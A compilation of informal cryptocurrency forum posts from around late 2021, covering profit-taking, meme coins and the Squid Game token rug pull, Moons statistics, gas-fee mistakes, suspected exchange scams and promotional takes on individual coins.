**TLDR:** Made lots of profit in 2017 hype, didn't sell, altcoins I was invested in bled to dead, never recovered. Was left with a red portfolio while I was able to take my 10x profit before, was too afraid to re-invest more money in the next bullrun.  
**The moral of this story**  
Make sure to take profits. Especially when investing in altcoins. Even if you are 100% sure they'll survive the bear market, because I was as well. What is wrong with taking out some money once in a while, re-evaluate the market, and see if you want to invest the same money somewhere else, or save it for a better time. Seeing profits can make you think unreasonable, especially if the people around you, or on the internet are pushing that same thought. So just take your time to reset your thoughts once in a while, re-evaluate the market and see if it's still save to invest all of our yprofits in it, or take some out if it's not.  
**To end with some positive thought, let's see what this new run can bring us (BTC 80-100K-???) and all in all have fun!**

If anyone honestly looked how the math works out in these coins they would see the majority of them are win wins due to removing bank overhead. Power to the people guys, decentralized networks are the future. 

Staking, liquidity pools, exhanges, and gas fees all take money out of peoples pockets then put them back in those that support the network. Instead of letting banks rake in all the transaction fees and loan interests rates, why not the average Joe like you and me? Governments and politicians are anti-crypto because it takes their power away, money is power people and we can take it back. Lets go on this journey together.

How is the supply count fixed for crypto coins?

Like we can see Bitcoin has a supply cap of 21million which sounds like a decent number while ETH doesnt have a supply cap but has an algorithm for the token supply but when it comes to coins like SHIBA INU, why do they have supply caps in trillions and quadrillions? I know profits depends on the market cap and percentage change but why would they have so many coins in circulation? While if they had less number of coins the effective price of the coin would be higher? 

Might sound a little dumb but had this doubt for a while. 

Thanks

A few days ago I made a post discussing how I shilled LRC to my dad and some friends. They doubled their money and were quite happy (I know it's not as up now but that besides the point). I found this quite satisfying and rewarding especially that it convinced my dad of what I was doing. It did however, get him asking about the size of my investments and how much I've made in profits. After posting about this I ended up getting mixed signals from people. Some people flamed the shit out of me and others were supportive or at least fine with it. I know it depends on the dynamic of the relationship but I'm curious how other people view it.

So, what are peoples thoughts on this and why ? If you have shared with friends/family/partners how did that go ? Has it gone badly? Is there any good from it ? What seems to be the general consensus ?

(I shared two screenshots of what some people said for context.)

Thanks brothas

Unless you are a trader for a living, i.e. a professional gambler, forget about the damn charts.

\-Yes but I do leverage trades and I need to ... Stop. 

\-Yes, but I put some in this latest meme coin and ... Just stop.

The problem with looking at charts is that, regardless of how much you zoom out, it's always the **last price action** that gets you triggered into FUD selling or FOMO buying. 

Research some coins, put some money in, maybe DCA, maybe not, follow the news surrounding your choices and just keep an eye on your investments every once in a while. Reassess your choices and positions at regular intervals and let them ride. 

Do you want to take advantage of crashes and pullbacks? Put up some low-price orders and enjoy averaging down.

And if you want to "invest" in meme coins, go ahead, take your initial capital out ASAP, let them ride and sleep like a baby. 

The above is some general advice that is applicable to the vast majority of people. You may be comfortable looking at charts without raising an eyebrow, but the truth is most people can't. And they get rekt.

And for the record, refreshing your coingecko portfolio every 5 minutes is like looking at charts. Please don't.

I know, 1ban=1ban or whatever coin, token, or asset you want to say 1=1.  I get that and its true - but it seems like everything is tied to and thought of in fiat values. Otherwise there wouldnt be any too the moon posts or talk about % gains or loses. 

If money is to be used as store of value, medium of exchange, or a unit of accounts, how will crypto be able to decouple itself from fiat and serve those same purposes. In places that have adopted Bitcoin as payment - is the Bitcoin price of goods and services based on the current exchange rate?  Does that make the Bitcoin price of, say, a cup of coffee fluctuate wildly while the fiat price remains more or less steady? 

I read the Mayor of Miami, among a few others, are going to accept a salary in Bitcoin. How is that even negotiated? Does the employee get a flat yearly salary of 1 Bitcoin (a paycheck of .0476 Bitcoin every two weeks) or does the employee get the amount of Bitcoin equivalent to their agreed upon fiat salary?  Wouldnt adoption of Bitcoin as a salary require renegotiation of the terms of employment? 

In short, has anyone actually used any crypto at a set rate not based on current fiat value equivalents? I feel like were all looking for mass adoption but Im not sure anyone has seen a good or service and said thats worth 1 Bitcoin without doing the quick mental conversion to our local fiat currency.  Or am I missing something?

It is difficult for new people who come to the crypto world to find their way around. I'm not at all surprised that people buy tokens like the Squid game. It looks too tempting for amateurs. When I first bought the coins, it was just shots in the dark.

I thought that everything worth $ 0.0000001 would one day rise to Bitcoin. I thought that what was rising at a rocket pace would not stop. And so on...

I have often been advised to do my own research, but even now, almost a year of day-to-day training and market monitoring, I know only a fraction of what I can do. It takes a long time for the newcomer to at least orient himself.

The best advice for me was to invest only as much as I could afford to lose. Really - that's why I don't regret anything yet.

Bear with me. 

If I buy BTC with local fiat and then purchase something off the internet with that BTC - it is a taxable event. If I buy USD with locla fiat and then purchase something off the internet with that USD - this is not a taxable event. Hence as far as currencies go BTC and USD are pretty far from equal. At least where I live. 

And somewhere deep down this really annoys me and also make it obvious we are nowhere near crypto as just another means of payment. 

The question is how long it will take to elevate crypto to the same level as fiat? If we believe crypto will follow the hype curve of other exponential technologies then maybe another 5 years before we have reached an acceptable state, but I fear that established financial institutes will make everything to delay things, leaving us high and dry for another 10 years at least. 

What about you?

Welcome to **Round 35 of the Cryptotrivial 2021 contest**!

I hope you all enjoyed Halloween, got your hard earned moons and be ready again to learn more about crypto!

# Question 35: How is called a Wealthy investors that seek out opportunities to provide funding for entrepreneurs or start-up companies?

The correct answer of **Round 34** is...

# Black Swan Event!

**What is a Black Swan Event:**

A Black Swan event in its simplest form is an event that comes as a surprise and has a significant effect.

The history of the Black Swan Theory - or the Theory of Black Swan Events - dates back to a Latin expression of the 2nd-century by Roman poet Juvenal, when he would characterize something as:

 *rara avis in terris nigroque simillima cygno* 

This Latin expression translates to a rare bird in the lands and very much like a black swan. Originally when this phrase was first used, it was thought that black swans did not exist.

The Black Swan theory was further developed by statistician and trader Nassim Nicholas Taleb. In 2007, he published a book entitledThe Black Swan: The Impact of Highly Improbable, which explained and formalized the Black Swan theory.

According to Taleb, Black Swan events generally follow three attributes:

* A Black Swan is an outlier. It is beyond that of regular expectations and as a result, nothing in the past could have predicted it.
* It always carries an extreme or significant impact.
* A Black Swan event, despite being an outlier and unpredictable, will certainly have a rational explanation concocted after its first occurrence, making that type of event explainable and predictable.

Examples of previous Black Swan events as described by Taleb, are the rise of the internet, the personal computer, the dissolution of the Soviet Union, and the September 11, 2001 attacks.

Hello, Im fairly new to this forum (about 2 months) however in that short period of time I have seen some really concerning posts from users who seem to have investing confused with gambling. It seems as though a lot of individuals in the crypto space are just problem gamblers who have turned to the crypto market to get their gambling fix. 

A majority of individuals here are just looking for the next big jackpot by tossing their money into any random project that gets pumped and shilled in hopes of striking it rich. Its literally no different than going to Vegas, spinning that slot wheel, and then telling yourself this next one is it! I can feel it! Sure some people make it, but a lot get burned, just look at the squid game token fiasco. I have read some posts of people putting in rent money, life savings, taking out loans and investing it into coins. That isnt investing, its gambling. I blame the meme coin hype.

Because of all the hoopla with Dogecoin and Shiba Inu, I was wondering if there any other low cap coins or meme coins that have attracted your fancy? Is it because of the hype potential or do you believe in its fundamentals/tokenomics? 

Hoping for serious replies as I have some spare time and would love to discuss and also try reading white papers. 

To reach the minimum character count lol, let me share my favourite quote, which is from the show Bojack Horseman - "When you look at someone through rose-colored glasses, all the red flags just look like flags"

What are the different types of nodes and what are their differences?

Hi!

Im thinking of starting my own node on a blockchain. My only problem is that i hdo not know anything about it at all. Is there somesort of great learning platform to learn about this? It seems that there are different types of nodes. The crypto i want to start a node mentions 2 different nodes. "node" and "backer nodes". What are the differences and is there one that generates more revenue?

Thanks!

&amp;#x200B;

Just ignore this, im trying to fill up the character count because for some reason this doesnt fill it up. Man, AVAX just hit a new ATH have you guys seen? crazy shit. Looking forward to seeign where that goes.

Serious question, does it really even matter anymore? I used to do tons of research before buying into anything, but it appears that all those projects barely gain any traction.

Meanwhile shitcoins, meme coins and random shills are exploding to the moon and beyond. I'm still sticking by my strategy of investing in long-term holds, but it is getting really hard to resist dropping a few dollars into random shitcoins or coins which are pumping randomly for some quick profits. 

How do you deal with this?

I recently decided to sell a stagnant token in order to increase my stake in a coin that I think could blow up any day now pending a potential huge announcement. However, the exchange my stagnant token was on didnt offer the coin I was interested in. After selling my tokens, I finally decided to try moving coins from one wallet to another for the first time. I opted to use ALGO since XLM transfers were disabled and I was speechless within 10 seconds, all of my ALGO moved from one wallet to another for pennies. No banks involved. No 3-5 business days for an ACH to process. I felt like I was in a JG Wentworth commercial because it was my money and I needed it now and through crypto, I was able to achieve that and I am still blown away. People need to stop sleeping on crypto. This is the future.

PS: enjoy the nice price increase to all my VET holders out there now that I sold out.

I got into crypto in the middle of the year, during the crash. I did not buy the exact bottom, but close to it. (Lucky me). So I have not really experienced a bear market yet. I did experience some crashes in September, but other than that I've only seen it go up for the most part.

Right now almost everything in my portfolio is "house money" as I took out most of the profits. But I was wondering what the bear market is like. Is it like minus 50% in the first day or a gradual drop over time?

Can you get out before the big drop? Of course everyone wants to sell the top, but it's not possible that everyone sells the exact top.

I can imagine that coins like DogeElonMars drop with 90% really quickly, but how about big coins like BTC and ETH? Would like to hear from people who experienced it before to know what it was like.

After having a nice run at the beginning of 2021 and reaching ATH (approx. 0.21$) at mid of April, VET fell back to approx. 0.049$ as fast as it rose until mid of July. From there on, the token benefited from the general crypto boom and rose again by factor &gt;2,4 to a current price of approx. 0.12 (with an intermittent slump in September). Measured by market cap, VET is currently in 24th place (according to CoinMarketCap).

What do you think will the the future path of VET? Will it ever reach ATH again or even go far beyond that or will VET sink into meaninglessness?

hey everybody, I have a question with which I hope you can help... sorry if this has been asked before...

this cycle I got 50 moons, which looks correct since I got 175 karma.

But last cycle I got 429 moons and I haven't moved them from my vault, so I was expecting like 80 moons more this cycle as reward for keeping them in the vault (20% of 429)

am I missing something?  Aren't we supposed to receive this 20% reward on  the previous cycle each month or is it changed?

Thank you for taking the time to answer this 

Enjoy your day and you moons

Has anyone won any airdrop on CoinMarketCap? I have been religiously participating in almost all the airdrops since May 2021 but I have never won anything. The status is reflected as either ended or awaiting results. How long do they take to process the results though, seems like it can take up to months for some. Sigh. Some airdrops have 557155 participants with 3000 winners, 235233 participants with 2000 winners. Guess Im not lucky enough. 

Add to watchlist. Follow on Twitter. Join Telegram group. Subscribe on Telegram channel. Retweet. Follow on Facebook. Now my Twitter and Telegram are flooded with spams and messages. And I still have not won a single airdrop :(((

Anyone knows any other platforms to participate in airdrops, win some tokens or even NFTs? :(((

title. is there any non-scam apps on the appstore? or maybe on windows

im a small miner (im mining off my 5600XT) and ive been mining since this summer. 

i now have a website where id like to spend some of my BTC, but all i have is a r/Nicehash account (where i can withdraw from) with some BTC on it

nicehash has an option to withdraw to an address, so lets say i make a key pair with [bitaddress](https://www.bitaddress.org/bitaddress.org-v3.3.0-SHA256-dec17c07685e1870960903d8f58090475b25af946fe95a734f88408cef4aa194.html) or something, and then move my BTC from nicehash to that, how do i spend it? theres a QR code on the website, how do i use that?

 So first of all please excuse me in advance english is not my native language.

The last days i had the same thoughts over and over again and just wanted to get rid of them here.

So i hate working from 9-5 every day only to spend 2 hours sobering up on the couch after being stuck in traffic for hours, knowing that this will continue for the next few years.

To be clear I don't hate working in general but I am at the moment at a point where seeing the same bored faces the same conversations about the same trivial topics everyday just piss me off. After being a lurker in this forum for a few years I decided to get more involved with crypto. And I must say I have not regretted a single second! Unfortunately, I do not know many people in my environment who know about crypto and even if only smile at me if i get to the topic like iam an idiot. The people here in the forum have shown me new ways to invest my money and given me in general a new hobby. And for this pinch of hopium for a better future I am thankful to all of you who take the time here to bring people like me closer to the world of crypto. Maybe with you guys we all can manage to live a life more or less better just because we invested in our knowledge here at this point at this time. Until then all the best and thanks for listening!

So I converted some of my ADA to Tether on Kraken so I could then transfer it to my Metamask Wallet. That all went fine. I did this so that I could then use the Polygon bridge app to transfer said Tether to the Polygon chain.

First I set the amount of Tether to the max amount. Then I clicked Transfer. The usual notice about what's supported and what isn't popped up and I clicked continue. The gas fee estimate was around 45$. I clicked continue again. and then again to take me to the Metamask confirmation window.

This is where the mistakes started happening. I went in to edit the priority of my transfer. I put in the lowest Gaslimit, The lowest Max priority fee, and the lowest fee possible. I clicked save and then confirmed. This didn't work at all. I got an instant error and nothing went through. I tried this a couple of times. The same thing happened. Then I tried raising the numbers slightly. Then things started happening. Polygon transfer was processing. However, The transaction failed again. I thought ok well my transaction just wasn't accepted because my fee wasn't high enough to be accepted for the next block, I'll just try again with the same figures until I get accepted.

After five fails I googled to find out what I was doing wrong and I figured out it was my Gaslimit. OK, so I'll try again and won't change the Gaslimit, just the lowest Max priority fee, and the lowest fee possible. It worked! But where is my Tether? Why is it not on my Polygon Wallet? Oh ok, it can take up to 8 minutes. Nope still not there. It's still sitting on the Ethereum chain. No Idea why but it is.

While I was trying to find out what wasn't working I had noticed that my ether balance dropped. What I didn't realise is that every time my transactions failed due to the "out of Gas" error I was actually paying the Gas fee without my transaction going through. For some reason, my brain had the information that I would be reimbursed for the failed transactions. Nope!

Luckily it wasn't a huge amount but enough to turn a good day into a bad one. Plus I feel a very dumb.

Anyhow have a nice morning, evening, night or day for you folks on the other side of the world. Cheers!

So eh. Kucoin claims multiple times that Lockton insures thier crypto assets.

Our team called Lockton as they were head quartered in The USA. They did a pervasive international search and have grave concerns and questions. Kucoin nor any affiliate they have listed on any registry comes back as a policy holder, or has a history of a policy being held

Kucoin will not give us an answer as to the policy holder or policy number but wants to give us a settlement offer for thier server outage September 7th 2021. This is a sliver of the assets lost while in thier care and trust

We were assured by Lockton, that they have the ability to look up insurance policies internationally through every company affiliate and geography.


This is getting weird

I know this is a rather unusual aka dumb move but let me explain. 
 
While I was checking all sort of charts I noticed that after the mega rug pull of SG, it went up again by 350% and couldn't believe my eyes. 

Given the fact that this shitcoin really went as high as going to the Mars before it was rug pulled, that 350% wasn't that much and I thought if it can go up by 350%, it could go up by even more or of course go back to zero.

I took the risk and just saw that my $20 that I was willing to gamble away went up to $90 within around 12 hours. So I took out $40 (my initial $20 + $20 gains) and have another $50 worth of SG. 

At this stage I have nothing to lose, I won't even look at the chart anymore. Next time I check my wallet and see that the $50 are gone, oh well tough luck but if that $50 doubles, I might take out another $50 to reinvest.

I'm not recommending those moves what I did and sincerely don't recommend to buy SQ or other shitcoins but wanted to share a little gamble that paid off.

I see a lot of people in this sub say to not even mention them or give them validation because its bad for crypto. 
You do realize there has always been shitcoins?

And Im not just talking about crypto. There is penny stocks, stocks of companies that are absolutely worthless that get pumped by people with money taking advantage of people with just a little money. Then there are penny stocks that absolutely go to the moon and become legitimate. 

There are going to be shitcoins as long as there is crypto, not talking about them wont get rid of them. Then people see a coin like squid game and think they found the next big thing because they know nothing about shitcoins or what the risk is. 

I kinda see it as harm reduction to actually discuss them and the risk you take. There are legitimate things you can look for in a token that can give you more peace of mind investing in them if you decide to do so despite the risk. Its glorified gambling, but that was all crypto at one point. 

Crypto is crypto.

Exchanges are already doing a lot to support the growth of the crypto economy. In fact, they have been very instrumental in facilitating the inflow of new users and money into the market which helped fuel the current bull market.

However, they can do a lot more to ensure that both the experienced and new crypto investors have a good user experience, facilitate more growth in the market, and support mass adoption.

&amp;#x200B;

How can they do these?

&amp;#x200B;

* **Supporting multi-chain deposits and withdrawals of crypto assets.**

Crypto investors have dozens of blockchains to interact with, which requires the movement or transfer of one coin or token from one chain to another as part of their normal crypto business operation.

The challenge is that the processes involved in this movement of funds across blockchains are tedious and in some cases economically impractical. This gives users a poor experience and even limit what blockchain or crypto services they can enjoy.

Exchanges can help solve this problem by supporting all or at least the most popular blockchains such as Ethereum, BSC, Solana, Avalanche, Polygon, Arbitrum, Fantom, Heco, etc, for deposits and withdrawals.

&amp;#x200B;

* **Easy fiat on-ramp and off-ramp.** 

As we all know, money is the lifeblood of every economy.

The fact that people are still asking "how can I cash out my crypto billions to my bank account" is evidence that exchanges still have a lot of work to do in this regard. 

People who want to cash out or invest their millions or even billionaires in crypto shouldn't find it nearly impossible or have to go through tedious and lengthy processes to do. 

I understand that this will effectively turn crypto exchanges into some sort of modern banks, but that's already what they are.

&amp;#x200B;

If we have enough exchanges with these 2 capabilities at 100% peak performance, money would be able to easily flow into and through the crypto economy, creating a robust market. And DeFi will thrive.

&amp;#x200B;

What other roles do you think exchanges can play in improving crypto investors user experience and expansion of the crypto economy?
-------------------------------

Pardon my ignorance, but I'm looking into investing in a few coins or blockchains and this question keeps me from doing that. Maybe because I started investing in stocks first, I look at current or expected future earnings before I invest. 

That brings me here. Apart from just being a store of value, how will future revenue be generated or is being generated? 

Is the revenue coming from users of the chain? 

Can someone eli5 perhaps using an example of a  coin or project you like? 

I was looking into ADA, Nano etc. but please feel free to use any project as an example. 

I'm new to this.

So all that happened while I did a post about the comparing the matority of this sub with subs from shitcoins/memecoins.

I got a few comments first that agreed with me  and I already was really happy that the amount of up votes would be irrelevant to me.

But then it happened, I got a private message saying I got tiped, first I could not believe it and after that I was really happy. That one person basically made my whole day.

This tip also shows that crypto has become more usual and is probably waaaaaaay easier to tip digitally than any other thing.

And the most importantly this is the first thing I directly earned (as I'm just a college student yet) . Of course I have moons and staking rewards but those are more indirect things you get as a "side product".

Crypto likely is the first "income" for many young people.

Most of us are anon characters, some will pose as millionaires, some are, some are not, do not get jealous, live within your means. Some of you live in countries where you don't need millions of dollars to live a high standard, don't be greedy and don't despise others just cos you were lucky enough to know what you know and to be involved in this industry. Some of us are so early that most people around us still don't wanna admit cryptocurrency is winning, you don't owe anybody anything, you've nothing to prove, just be yourself, stay focused and stay safe. Don't forget to help as much people as you can, not compulsory but it's just kind, that smile you may put of someone else's face may go a long way to help others too. You may never know how and when but that's what we live for, to help each other, not only financially but even sometimes with our little cryptocurrency knowledge can go a long way. Imagine if you got someone to use a DeFi dapp that did an airdrop and this person was eligible to receive free tokens, how happy would you be? Help as much people as you can, it sometimes takes a few minutes. WAGMI

Arr mateys! This is Captn' Retr_0astic back with a guide that this old Captn has learnt from experience.

Don't try to spot the top:
Spotting the bull market too is tricky even for experienced trader, faring the rough seas for a new pirate is hard enough on its own trying to surf the waves with your ships isn't what you should be looking to do.

My advice would be to set trailing stops so you can get out in the event of the top being realized or better yet, manage your expectations, set a modest goal that you'd like to cash out, then set a sell order at that price, everything above that price should be taken for granted.

Even though the price/goal you set is discretionary, keep in mind you should have your goal/price set modestly as too high of a goal could easily be triggered in the event of a short-term pullback, and if you set an unrealistic price target in your minds such as $500k, you're just setting yourself up for disappointment, set a mental target of $100 k as an example and everything higher is just a surprise Christmas present.

That's it for now, I'm of to fill my coffers, I suggest you all to do the same, if you've anything to say, my parrot will talk to ye, be careful, he bites.

I am DOT fan and have a some portion of my portfolio in it. 

As parachain auctions are comming I was dragged into the hype and red through projects that are candidates for first 5 slots. But as reward scheme gets revealed (It is vastly different from Kusama version.), I dont see a point to participate. 

Here me out and correct me if I am wrong. 

Eventho you like project like Acala, why participate to get 3 USD on your dot of reward. If I can just sell portion of my bag and realize profit (when dot is pumping right now), then buy their token and buy LCDOT (or BDOT - I have heard guesses that it might even trade in 0.3:1 ratio early on).

Am I missing something?

I have been scouring web searches and cannot find much information about xmtflux.com.
All I could find was some information about the possibility its companies IPO listing in stock news something about its companies value went from 7 million to 28 billion by 2018, and its relationship with PayPal. Like paypals cryptos that are sold on paypal are actually held on this exchange. But like I said, I couldnt find out if this information is actually accurate. Does anybody know anything about xmtflux.com? and its legitimacy? I actually NEED to know because I have some funds there (please dont ask how) BUT before I can withdrawl I need certain verification steps not only kyc, but sending a certain amount of either bitcoin or ether from another exchange to my wallet there to further lrove my identity then afterwards I can withdrawl all my funds. Im on plenty of exchanges and never heard of such nonsense and I dont want to continue if it is a scam. Which would really really suck actually. Thanks so much for any info anyone knows of this site.

With a slight increase in moon ratio and stricter spam rules we've all enjoyed a little more moons this round :). 

Here are some random stats for Round 19 :

&amp;#x200B;

**Top Earners**

* Top 0.1% had 9032.33 Karma or more (2601.31 moons \*)
* Top 1% had 2172.74 Karma or more (625.75 moons \*)
* Top 10% had 202.00 Karma or more (58.18 moons \*)
* Top 25% had 48.00 Karma or more (13.82 moons \*)
* Top 50% had 12.00 Karma or more (3.46 moons \*)

&amp;#x200B;

**Moon earning stats**

* Users with maxed 15k Karma: 10
* Users with 10k to 15k Karma: 25
* Users with 5k - 10k Karma: 100

&amp;#x200B;

* Total Moon Earners (at least 1 Karma):  43864
* Average Karma earned: 125.67
* Average Moons earned: 36.19 \*

&amp;#x200B;

**Users with No vaults** 

* Number of Redditors that earned Karma (but no vault): 15213
* Cumulative Karma earned: 321761 Karma
* Total Moons waiting: 92667.168
* Average Moons per user (with no vaults): 6.09   

&amp;#x200B;

**Monthly Tipping stats**

* Total moons Tipped: 17 858
* Total Receivers: 1786
* Tippers: 769

**Monthly top 15 most generous tippers :**

Here's a list of those who tipped the most moons this past month. 

I have excluded all those who only tipped 1 person (since I assume this was simply  a transfer of moons and not necessarily a tip). Hence Rank no 11, 12, 14 were excluded as they only tipped 1 single person.  If you think this exclusion was wrong, well let me know in the comments below :)

**Monthly top 10 most diverse tippers:**

And here's a list of those who tipped a lot of different users.

*^(All tipping data sourced from ccmoons.com)*  

**The list of MVP Tippers:**

The following redditors are extra special - as they are both top 15 in tipping generosity  and tipping diversity. In other words these MVP redditors tip many people, and they generally tip more than 1 moon at a time. 

*  u/largesnorlax 
*  u/Devilheart

&gt; consumer goods and services were 3,4% more expensive than last year, says the CBS (central bureau of statistics). The inflation in oktober was the highest after April 2002.

Why is is the inflation rate rising at the moment?
Its mostly because of increasing gas and electricity prices. The price increase of gas year after year was 18,3%. From September to oktober, it was an increase of 30,6%!
Electricity was 39,6% more expensive in oktober than in September. 

Also motor fuel and clothing got more expensive this year. More information at the following link, its in Dutch. But maybe your browser can translate it.

I left Crypto a few years ago when I cashed out decent gains from XRP and Bitcoin.  In 2016 I bought Bitcoin from localbitcoins website that had me meeting up with a person who is selling their Bitcoin.  It was strange experience buying some digital currency where I gave the guy real money (around $600ish at that time).  I later bought some more Bitcoin from another local guy and had total about $800.  Some intuition told me to Shapeshift that Bitcoin into 600,000 XRP which was worth near the 1 Bitcoin I had at that time but I instead just bought 80k of them.  In late 2017 XRP price ran to $4 on news that it will get listed on Coinbase and I cashed out as it started crashing and made out with like $40k.  Had fun vacations and all.  Good happy times.  Sometime later I was scammed by a Coin 2 Pal website run by some Russian doctor, he was smart scammer too.  He lured people into trusting him and he cashed out Bitcoin a few times for them waiting for the third time to take off with a bigger amount of Bitcoins they send him once he gains their trust.  So on the third time he stole 2 Bitcoin from me, that time worth like $2,000ish and the website starts displaying some "hacked" error saying the website is getting hacked which was obviously he and his team just purposely using script to show that error.

Other Redditors on the Bitcoin sub also mentioned that he stole Bitcoin via his service.  I hope Russian authorities caught him.  By now all the coins he stole would be worth in the Millions if not Billion.  I have a feeling he knew the future potential of Bitcoin and its price so he most likely held onto all of them.

And then there are the cases of countless worthless ICO's that made off with peoples money.  I believe that Digix DAO and some others were one of the notable ones that scammed people IIRC.  The most obvious one was the Israeli Crypto ICO CloudCoin, the dude pumping it was the founder of it and he made people believe the Cloud coin or token would be making people money while they don't do anything all for storing other peoples data in the cloud or something to that wording.  The way he said "Earn Substantially More" with his odd smile and his sorta baby face made me suspicious of his ICO.

Some other ICO's from Poland and other places also took off with peoples money in ICO's and people never ended up making the money they thought they would.  Lots of young guys who don't want to work 8-5 harsh jobs were often the victims of these ICO scams.  

The recent Rug pull by the Squid doesn't surprise me.

So he careful people, it is a scam world out there.  Lots of financial crimes happen all the time in the world.  The ICO's that are scammish can look legitimate and have the staff and founders pictures and also get a whitepaper etc etc.  Any group of people can do all this to launch a coin or token and impress the people with visually delighting Blockchain website.

I know this is discussed constantly on here, but is this going to be a permanent bull run? When I say permanent bull run I don't mean constant upside, I mean no massive corrections up to 90% kick-starting a few years of low volatility and general downside. The only real point in favour of this I can think of is the tremendous adoption we've seen this past year. Outside of that, I'm not sure why this time is any different. 

No this post isn't for sharing my opinion. I want to centralize this discussion here because I am genuinely curious. I see this talked about constantly on the daily discussion but it's just threads of maybe four comments. Im assuming the consensus on this is no, but at the same time I'd really like to know why those who think the answer is yes think that way.

As the title says, its a common thing in the crypto space to ask when lambo. But not all of us have a lambo at our end goal in crypto. For example some of us want financial independence or to not work 9-5. So whats your end goal in crypto. 

Bonus question: will you ever cash out or do you think you will stay until mainstream adoption comes.

I need to fill space for this 500 character minimum so Im going to rank my favourite groceries that I buy on a weekly basis from 1-5:
1. Avocado
2. Peanut butter
3. Toilet paper
4. Isopropyl Alcohol

Checking today's top gains , guess who was number one?  Squid game with about 1300% gain in ONE DAY!  How does a coin go up 13x the day after it was busted.

All the "investors" had to do was be an Average Joe and visit coin market cap once or maybe google it once?

The coinmarketcap page for Squid in filled with Warning like  "**We have received multiple reports that the website and socials are no longer functional &amp; users are not able to sell this token in Pancakeswap. There is growing evidence that this project has** **rugged****. Please do your own due diligence and exercise extreme caution. This project, while clearly inspired by the Netflix show of the same name, is NOT affiliated with the official IP.** " It is then followed by articles like this : ['I Lost Everything': How Squid Game Token Collapsed](https://coinmarketcap.com/alexandria/article/i-lost-everything-how-squid-game-token-collapsed)

The crypto game kept getting unpredictable this year , but this is just insane. Squid game mentioned everything in the white paper, it wasn't a scam like One coin , who spread false hope .

JASMY COIN

Im not going to lie. I thought it was a poop coin and was pretty angry it wasnt Fantom. So I read the whitepaperand Im mildly impressed. Quick rundown. 

TEAM 

Kunitake Ando- Former President and COO of Sony Corporation. 

Kuzumasa Sato- Operating officer of Sony Marketing and President of Sony Style Co. 

Masanobu Yoshida- President of Sony Handheld, Sony Ericsson Mobile Communications. 

There are more but this is the core.

VISION

We aim to realize a data democracy by building a decentralized, democratic world where data is protected as inherently owned by each individual.

Basically, JASMY is trying to solve the problem of centralized consumer data. IoT collected data, from our phones, laptops, smart homes, etc. is given/sold to companies for stats and products on a regular basis. All that data is on centralized entities leaving it vulnerable to massive data breaches, inaccurate statistics, and more. Centralized consumer data also takes away the power to share data from the consumer (us). We get very little choices on how our data is shared. JASMY wants to solve this by decentralizing data utilizing blockchain technology. 

It sounds like they are doing this by creating a decentralized platform (called Jasmy Platform) used by people and companies that can do a multiple of things only possible through blockchain such as verification (digital ID), personal data lockers in which every individual has their own locker from which they can choose what data they share, tracing of data, something called SKC where companies can access data only when necessary vs. storing all of it on in-house records, something called SG which can connect devices to their owners without additional personal ID, and a slew of other things as well. 

Their white paper also states that companies must reward their consumers for sharing their data (maybe in JASMY tokens?) as a way to further the mentality that data sharing should be a democracy. 

To me it sounds like their platform is built for personal use and institutional use as there is a whole section on how, for example, adoption of the decentralized JASMY platform at a typical call center could solve a whole bunch of problems ranging from functionality to risk to efficiency to cost. 

The JASMY token will be used for a range of things within this ecosystem. 

ROADMAP/PARTNERSHIPS

According to the whitepaper they launched the JASMY initiative to accelerate adoption by working with companies willing to take the lead in this project. This actually launched back in January 2019 which means they have been working on this for a while fine tuning their platform. 

Okay, this is actually HUGE. JASMY partnered with Toyota and Witz in JUNE. Witz develops automated driving technologies and IoT for companies like Toyota and Panasonic and in June they revealed that theyre working on JASMYs blockchain platform! This is crazy. Was not expecting that. 

The article also states that JASMY partnered with Transcosmos which is a call center supporting 21,000 operators. 

[Article](https://jasmy-global.medium.com/jasmy-transcosmos-blockchain-pc-a-large-japanese-calling-center-43f91fe63258) 

They have partnered with VAIO which could mean JASMY platform could be utilized in VAIO products. There are also a few other partnerships as well mostly Japanese. Its worth noting that the director of JASMY is the current President of US Sony manufacturing- US entry in the works? 

If you look at their timeline there was a lot of work being done well before the launch of JASMY on Coinbase so it could be that they are entering the adoption and marketing phase after the  initiative on their platform. 

[More info- scroll to bottom for English.](https://www.jasmy.co.jp/en_info.html)

Although were still learning more a few things are clear. 

- This is not a poopcoin. This is a really interesting use of blockchain technology and in my eyes the need to decentralize consumer data is huge and I like it. 

- The team is solid and tons of experience in technology, marketing, and innovation.

- This was not a random release on Coinbase. It makes sense with CB breaking into the Japanese market. I have no doubt that they are searching for other Japanese projects to eventually add to Coinbase Japan.

All of these meme coins have me interested. Blockchain technology seems logistically complicated, but with all the meme coins popping up, maybe it is not so hard as I thought. Here is what I am thinking, all one has to do is get a website, make a new meme coin, buy billions of the coin for nothing, then spread the word and get rich. Just wondering if there is anyone here that knows how complicated the process of making a new coin is, and would be willing to describe it. If not, props to those who made shit like squid game. 

Hope you all are happy trading, that we all moon soon, and that this post matches the god damn character limit.

What's wrong with people still investing in Squid Game token ? Like seriously, pardon my language... Are people that dumb to still throw out their hard earned cash to some devious rugpull ? MAN, WHAT THE FUCKING F ? I understand some of us want to make a quick buck but THIS IS REALLY NOT THE WAY !

If you're in, unfortunately the term get out is not appropriate and you will find out soon why...

[A simple GOOGLE SEARCH before throwing your cash could be life changing...](https://preview.redd.it/m9y4lrxg1jx71.jpg?width=884&amp;format=pjpg&amp;auto=webp&amp;s=2fd2fb73f9df7a1d0bf4745d1733e7d91de0cc5a)

If you want to throw some money and try making a quick buck, you have a better shot at lotteries or  some other shit meme coin.

How can IOTX be $.17 on Binance but $.27 cents on Coinbase at the same time?

I just saw a post saying there is a big arbitrage opportunity by buying IOTX on Binance for 17 cents and selling on Coinbase for 27 cents. How can there be such a big disparity between the two exchanges? Is there something weird going on?

So theoretically I could buy $1000 worth of IOTX on Binance, transfer to Coinbase, and sell for $1630? That sounds too good to be true. Someone please critique this logic. that's a pretty big gap.

Please let me know quick because if its a real opportunity its time for me to FOMO into it and make some quick money.

Hello community, I have swapped 19575.56 NFTL token for BUSD with multihopping on, on pancakeswap. The token swap seems to have split into two pieces due to the multiphop which sometimes happens i agree. But i did not receive the first part of the split on my wallet. Here is my tx id. Normally what should happen is i either receive PEG-ETH for the last step or there should be one more step to convert the PEG-ETH to BUSD but that step is not there so i basically lost 140\~ USD, it is totally gone. What do you think ?

TX BSC Network: 0xadeb9392979db582eadb7d55c60687edcd1a0eec1c8a8404d071beabc8aaddea

It seems very strange as to why Pancakeswap would convert the initial WBNB to PEG-ETH instead of BUSD on the 4th transaction, and also strange that the first transaction to send the tokens to the NFTL contract instead of Pancakeswap router, strange things happening in the first 4 steps i mean.

